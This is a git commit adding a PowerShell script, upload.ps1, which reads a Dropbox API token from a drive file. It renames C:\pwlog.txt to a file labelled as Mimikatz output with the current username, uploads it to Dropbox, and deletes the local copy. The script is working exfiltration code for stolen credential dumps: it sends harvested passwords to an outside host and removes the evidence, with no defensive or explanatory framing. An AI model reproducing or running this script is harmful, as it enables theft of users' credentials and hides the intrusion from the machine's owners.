f351a51653d9eaeb38a994c3eea4dac69ad81996
UpmostGoat <78240157+UpmostGoat@users.noreply.github.com>
2023-07-21 08:23:33 -0700

    Add files via upload

---
+++ upload.ps1
@@ -0,0 +1,26 @@
+﻿$DropBoxAccessToken = Get-Content -Path X:\apiToken.txt
+
+function DropBox-Upload {
+
+[CmdletBinding()]
+param (
+	
+[Parameter (Mandatory = $True, ValueFromPipeline = $True)]
+[Alias("f")]
+[string]$SourceFilePath
+) 
+$outputFile = Split-Path $SourceFilePath -leaf
+$TargetFilePath="/$outputFile"
+$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
+$authorization = "Bearer " + $DropBoxAccessToken
+$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
+$headers.Add("Authorization", $authorization)
+$headers.Add("Dropbox-API-Arg", $arg)
+$headers.Add("Content-Type", 'application/octet-stream')
+Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
+}
+
+Rename-Item -Path "C:\pwlog.txt" -NewName "Mimikatz - $env:username.txt"
+DropBox-Upload "C:\Mimikatz - $env:username.txt"
+
+del "C:\Mimikatz - $env:username.txt"
